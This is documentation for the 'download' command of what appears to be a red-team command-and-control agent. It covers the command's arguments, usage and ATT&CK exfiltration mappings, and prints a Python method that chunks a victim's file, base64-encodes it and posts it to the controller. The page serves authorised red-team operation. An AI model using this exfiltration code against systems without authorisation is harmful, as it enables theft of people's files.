+++
title = "download"
chapter = false
weight = 100
hidden = false
+++

## Summary

Download a file from the target machine. 
     
- Python Versions Supported: 2.7, 3.8     
- Needs Admin: False  
- Version: 1  
- Author: @ajpc500  

### Arguments

#### remote_path

- Description: /remote/path/on/victim.txt  
- Required Value: True  
- Default Value: None  

## Usage

```
download /remote/path
```

## MITRE ATT&CK Mapping

- T1020
- T1030
- T1041

## Detailed Summary
This function uses API calls to chunk and transfer a file from the agent:

```Python
    def download(self, task_id, file):
        file_path = file if file[0] == os.sep \
                else os.path.join(self.current_directory,file)

        file_size = os.stat(file_path).st_size 
        total_chunks = int(file_size / CHUNK_SIZE) + (file_size % CHUNK_SIZE > 0)

        data = {
            "action": "post_response", 
            "responses": [
            {
                "task_id": task_id,
                "total_chunks": total_chunks,
                "full_path": file_path,
                "chunk_size": CHUNK_SIZE
            }]
        }
        initial_response = self.postMessageAndRetrieveResponse(data)
        chunk_num = 1
        with open(file_path, 'rb') as f:
            while True:
                if [task for task in self.taskings if task["task_id"] == task_id][0]["stopped"]:
                    return "Job stopped."

                content = f.read(CHUNK_SIZE)
                if not content:
                    break # done

                data = {
                    "action": "post_response", 
                    "responses": [
                        {
                            "chunk_num": chunk_num,
                            "file_id": initial_response["responses"][0]["file_id"],
                            "chunk_data": base64.b64encode(content).decode(),
                            "task_id": task_id
                        }
                    ]
                }
                chunk_num+=1
                response = self.postMessageAndRetrieveResponse(data)

```